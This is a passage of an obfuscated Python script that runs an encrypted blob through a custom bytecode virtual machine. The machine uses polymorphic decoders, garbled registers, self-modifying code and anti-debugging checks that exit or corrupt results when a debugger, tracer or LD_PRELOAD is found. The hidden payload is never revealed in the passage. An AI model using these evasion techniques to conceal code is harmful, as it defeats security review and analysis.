#!/usr/bin/env python3
def _wogrvt(_gqhcou):
    return _gqhcou % 6267 + 1

import hashlib as _ehvyis, hmac as _jvcgkkcpr, base64 as _erzowhix, sys as _doqtmuaj, zlib as _kddwy
_gqhcou = 138534
_ejsgy = """ENalcrrhfagPVeGr5VhXWg8lG2tQuBxPn1oBLNIlXUXuxwLY4V4eS+SR+L9Z7+nav/ONGl1bo2hTqzugi2VQ0MXHKTfhZG/DhQU3MwLzr97lKAjKrGcOSjwVnjXBoGLuZRCZP3iPhK4vYK7Cpcqk6LkOSjn8GSEQ78u2K6FqNz3pkCA5XgLpGSHS/kKUS9nphNlrvcl06P3EQS/XdVXcLSqTy/S5q5+23usibFTj6RJslHw77a/s1rJsAje5m2eq9pMzFG71u1y7fkKyIdPO3NzgQ1iCLfXfDvPuUHrRie8FcO/9QmjG+5zWSnfE59dJNY3jFfG6cqAIcJ+qcQevCEBsiYfSsBF+jKyZiXLTyAI+FtJCkE8feaVsjz/wpRnnHELXYTCTjU1oZtFltN0S0JjHaJdctljUwzigTHm/XCL544JpGgKZkRN7+vrg/R+4/40+At1BPBfd6pqWKZgQ1IjwALTrphxTMAvzCDy3KbRalBVdAzH2+7RlOIaCzvHscKzB8GkPEUWc0d/e6dV6Cxrxzwl0DWuYP6PFXqN/DZKh/PCOWIaLnbfoXPxwVvIEYLy2fJUpLIiFH8fUtLlrDOsBdlh6ejw/RQKK7/RlLqHPEwV27hZqRg7HE837nRjVlGKOEkgRx+fUb4hIPSrrR85w+7p/CyjjcmfN8H3v66XyLJgSvMpmlKTu/XS7KPgKxw/bPzY6i1aT8Dr7t6fP+Pb45gPV6TNe1TO+Fhai9rDncr8m7qeKokdPgpzv5HXb6mkvHBy1IORqSj4os/dGxhOYIYzkbvDBR8iLEX+jnZdGzwY18jUX1IhHVmpLaD4ti1/ksvQUE6/o1dnPzpbRR0bBpBShnX5c8sUwUR0Cptrhqt5iWTQ17WF9SJyUc5HjtiX78V1vsy4TeISJq52V4WH5nCk2aaKGYQ=="""
_gefitbrd = 3
_gwidz = _wogrvt(_gqhcou)

# Helper: return (mapped_rs2, unmapped_rs2) for ops that use rs2 as count
def _vm_rs2(_dec, _rm, _op):
    _raw = _dec[3]
    _mapped = _rm[_raw & 0x3F] if (_raw & 0x3F) < 64 else 0
    # Ops using rs2 as count (not register): BUILD_TUPLE(43), BUILD_LIST(44), BUILD_STRING(63)
    # Also BUILD_STRING - the Python compiler uses rs2 for count. Others use _imm low bits.
    _count_ops = frozenset((43, 44, 63))
    if _op in _count_ops:
        return _raw, _raw  # return unmapped as both (used as count)
    return _mapped, _raw  # mapped for register, raw for reference

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2, 0
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4, 0
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2_m = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _rs2_u = _b4 & 0x3F
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _count_ops = frozenset((43, 44, 63))
        _rs2 = _rs2_u if _op in _count_ops else _rs2_m
        return _op, _rd, _rs1, _rs2, _imm, 9, _rs2_u
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2_m = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _rs2_u = (_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        _count_ops = frozenset((43, 44, 63))
        _rs2 = _rs2_u if _op in _count_ops else _rs2_m
        return _op, _rd, _rs1, _rs2, _imm, _ilen, _rs2_u

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2, 0
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3, 0
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3, 0
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2, 0
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4, 0
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4, 0
        # Fallback
        return 0, 0, 0, 0, 0, 2, 0
    elif _cls == 2:
        # Long class
        _count_ops = frozenset((43, 44, 63))
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2_u = _b4 & 0x3F
            _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9, _rs2_u
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2_u = _b3 & 0x3F
            _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9, _rs2_u
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2_u = _b2 & 0x3F
            _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10, _rs2_u
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2_u = _b4 & 0x3F
            _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9, _rs2_u
        return 0, 0, 0, 0, 0, 2, 0
    else:
        _count_ops = frozenset((43, 44, 63))
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2_u = (_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F
        _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen, _rs2_u

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys, random
    import time as _vm_tm
    import os as _vm_os

    # ─── Anti-Debug Layer 1: Trace & Module Detection ───
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in sys.modules for x in ['pdb', 'pydevd', 'pydevconsole', 'IPython.terminal', 'pydevd_frame_evaluator']):
        sys.exit(1)

    # ─── Anti-Debug Layer 2: ptrace Detection (Linux) ───
    if _vm_os.path.exists('/proc/self/status'):
        try:
            with open('/proc/self/status') as _vm_sf:
                for _vm_line in _vm_sf:
                    if _vm_line.startswith('TracerPid:'):
                        if int(_vm_line.split(':')[1].strip()) != 0:
                            sys.exit(1)
                        break
        except Exception:
            pass

    # ─── Anti-Debug Layer 3: Environment Scan ───
    for _vm_var in ['PYTHONBREAKPOINT', 'PYTHONDEVMODE', 'PYCHARM', 'PYDEVD']:
        if _vm_var in _vm_os.environ:
            sys.exit(1)
    if 'LD_PRELOAD' in _vm_os.environ:
        sys.exit(1)

    # ─── Timing Infrastructure (detect single-step debugger) ───
    _vm_timing_interval = random.randint(30, 80)
    _vm_t0 = _vm_tm.time()

    # ─── Register init ───
    _reg_map = list(range(64))
    random.shuffle(_reg_map)

    # ─── Split-register bank with rotating XOR garbler ───
    # _r_even holds runtime regs 0,2,4,...,62
    # _r_odd  holds runtime regs 1,3,5,...,63
    _r_even = [None] * 32
    _r_odd = [None] * 32
    _garbler_keys = [[random.getrandbits(64) for _ in range(64)]]

    def _r_get(_ix):
        _vv = _r_even[_ix >> 1] if (_ix & 1) == 0 else _r_odd[_ix >> 1]
        if isinstance(_vv, int):
            return _vv ^ _garbler_keys[0][_ix]
        return _vv

    def _r_set(_ix, _vv):
        if isinstance(_vv, int):
            _vv = _vv ^ _garbler_keys[0][_ix]
        if (_ix & 1) == 0:
            _r_even[_ix >> 1] = _vv
        else:
            _r_odd[_ix >> 1] = _vv

    # Re-garbler: rotate all 64 XOR keys simultaneously
    def _r_re_garbler():
        _nk = [random.getrandbits(64) for _ in range(64)]
        for _gi in range(64):
            _gv = _r_even[_gi >> 1] if (_gi & 1) == 0 else _r_odd[_gi >> 1]
            if isinstance(_gv, int):
                _dv = _gv ^ _garbler_keys[0][_gi] ^ _nk[_gi]
                if (_gi & 1) == 0:
                    _r_even[_gi >> 1] = _dv
                else:
                    _r_odd[_gi >> 1] = _dv
        _garbler_keys[0] = _nk

    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)

    def _rr(_base_runtime, _offset):
        _cbase = _reg_map.index(_base_runtime)
        return _reg_map[_cbase + _offset]

    # ─── Control-flow flattened dispatch ───
    # Uses rotating dispatch modes to break the single decode-entry pattern
    _dispatch_state = 0
    while _ip < _n:
        _cycle += 1

        # Anti-debug: timing check — single-step makes per-cycle time spike
        if _cycle % _vm_timing_interval == 0:
            if _vm_tm.time() - _vm_t0 > 0.25:
                _r_set(_rd, None)  # silently corrupt dest to evade
            _vm_t0 = _vm_tm.time()

        # Periodic re-garbler: rotate keys every 32 cycles
        if _cycle & 0x1F == 0:
            _r_re_garbler()

        # Rotating dispatch: 4 modes, changes each cycle
        # Prevents an analyst from placing a single breakpoint that
        # catches all decode paths
        _dispatch_state = (_dispatch_state + (_cycle & 1) + 1) & 0x3
        _guard_0 = _cycle ^ _cycle  # always 0 — opaque predicate

        if _dispatch_state == 0:
            # Mode 0: guarded decode — opaque predicate makes it look
            # like two possible decode paths (but only one is live)
            if _guard_0 == 0:
                _op, _rd, _rs1, _rs2, _imm, _ilen, _ = _decode()
        elif _dispatch_state == 1:
            # Mode 1: direct decode (different line number)
            _op, _rd, _rs1, _rs2, _imm, _ilen, _ = _decode()
        else:
            # Mode 2/3: alias decode — same result, different source location
            if _dispatch_state == 2:
                _op, _rd, _rs1, _rs2, _imm, _ilen, _ = _decode()
            else:
                _op, _rd, _rs1, _rs2, _imm, _ilen, _ = _decode()

        if _op == 0:
            pass
        elif _op == 1:
            _r_set(_rd, _consts[_imm])
        elif _op == 2:
            _nm = _names[_imm]
            _r_set(_rd, _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm))
        elif _op == 3:
            _globals[_names[_imm]] = _r_get(_rd)
        elif _op == 4:
            _r_set(_rd, _locals.get(_names[_imm], None))
        elif _op == 5:
            _locals[_names[_imm]] = _r_get(_rd)
        elif _op == 6:
            _r_set(_rd, _r_get(_rs1))
        elif _op == 60:
            _r_set(_rd, getattr(_r_get(_rs1), _names[_imm]))
        elif _op == 61:
            _r_set(_rd, __import__(_names[_imm]))
        elif _op == 10:
            _r_set(_rd, _r_get(_rs1) + _r_get(_rs2))
        elif _op == 11:
            _r_set(_rd, _r_get(_rs1) - _r_get(_rs2))
        elif _op == 12:
            _r_set(_rd, _r_get(_rs1) * _r_get(_rs2))
        elif _op == 13:
            _r_set(_rd, _r_get(_rs1) / _r_get(_rs2))
        elif _op == 14:
            _r_set(_rd, _r_get(_rs1) ** _r_get(_rs2))
        elif _op == 15:
            _r_set(_rd, -_r_get(_rs1))
        elif _op == 20:
            _r_set(_rd, _r_get(_rs1) == _r_get(_rs2))
        elif _op == 21:
            _r_set(_rd, _r_get(_rs1) != _r_get(_rs2))
        elif _op == 22:
            _r_set(_rd, _r_get(_rs1) < _r_get(_rs2))
        elif _op == 23:
            _r_set(_rd, _r_get(_rs1) <= _r_get(_rs2))
        elif _op == 24:
            _r_set(_rd, _r_get(_rs1) > _r_get(_rs2))
        elif _op == 25:
            _r_set(_rd, _r_get(_rs1) >= _r_get(_rs2))
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r_get(_rd):
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r_get(_rd):
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r_set(_rd, _r_get(_rs1)[_r_get(_rs2)])
        elif _op == 50:
            _r_get(_rs1)[_r_get(_rs2)] = _r_get(_rd)
        elif _op == 40:
            _fn = _r_get(_rs1)
            _args = tuple(_r_get(_rr(_rs1, 1 + _i)) for _i in range(_imm & 0xFFFF))
            _r_set(_rd, _fn(*_args))
        elif _op == 41:
            _r_set(_rd, _names[_rd](*[_r_get(_rr(_rs1, _i)) for _i in range(_imm & 0xFFFF)]))
        elif _op == 42:
            return _r_get(_rd)
        elif _op == 43:
            _r_set(_rd, tuple(_r_get(_rr(_rs1, _i)) for _i in range(_rs2)))
        elif _op == 44:
            _r_set(_rd, list(_r_get(_rr(_rs1, _i)) for _i in range(_rs2)))
        elif _op == 62:
            _r_set(_rd, str(_r_get(_rs1)))
        elif _op == 63:
            _r_set(_rd, ''.join(str(_r_get(_rr(_rs1, _i))) for _i in range(_rs2)))
        elif _op == 70:
            _r_set(_rd, iter(_r_get(_rs1)))
        elif _op == 71:
            try:
                _r_set(_rd, next(_r_get(_rs1)))
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r_get(_rd).extend(_r_get(_rs1))
        elif _op == 75:
            _r_get(_rd).append(_r_get(_rs1))
        elif _op == 52:
            _v = _r_get(_rs1)
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r_get(_rs1)
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r_get(_rs1)
            _argc = _imm & 0xFFFF
            _args = tuple(_r_get(_rr(_rs1, 1 + _i)) for _i in range(_argc))
            _r_set(_rd, _fn(*_args))
        elif _op == 81:
            _obj = _r_get(_rs1)
            _vtable = _r_get(_rr(_rs1, 1))
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r_get(_rr(_rs1, 2 + _i)) for _i in range(_argc))
            _r_set(_rd, _method(_obj, *_args))

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r_get(_rd)
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r_get(_rs1)
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r_set(_rs1, _exc)
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r_get(_rd)
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r_get(_rd)
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            _o = _r_get(_rd) ^ _r_get(_rd) if isinstance(_r_get(_rd), int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            _m = _r_get(_rd) | 0 if isinstance(_r_get(_rd), int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            _o = _r_get(_rs1) ^ _r_get(_rs1) if isinstance(_r_get(_rs1), int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r_get(_rd) - _r_get(_rs1) if isinstance(_r_get(_rd), (int, float)) and isinstance(_r_get(_rs1), (int, float)) else 1
            _v = _r_get(_rd) & 0xFFFFFFFF if isinstance(_r_get(_rd), int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r_get(_rd)
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r_get(_rd)
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r_get(_rd))
        elif _op == 121:
            if _spill_stack:
                _r_set(_rd, _spill_stack.pop())
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64:
                        _spill_stack.append(_r_get(_reg))
                        _r_set(_reg, None)
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r_get(_rd)
            _plen = _r_get(_rs1)
            _key = _r_get(_rs2)
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r_get(_rd)
            _plen = _r_get(_rs1)
            _key = _r_get(_rs2)
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r_get(_rd)
            _plen = _r_get(_rs1)
            _key = _r_get(_rs2)
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r_get(_rs1)
            _t = (_v ^ _v) & 0
            _r_set(_rd, _t | _v)
        elif _op == 141:
            _v = _r_get(_rs1) + _r_get(_rs2)
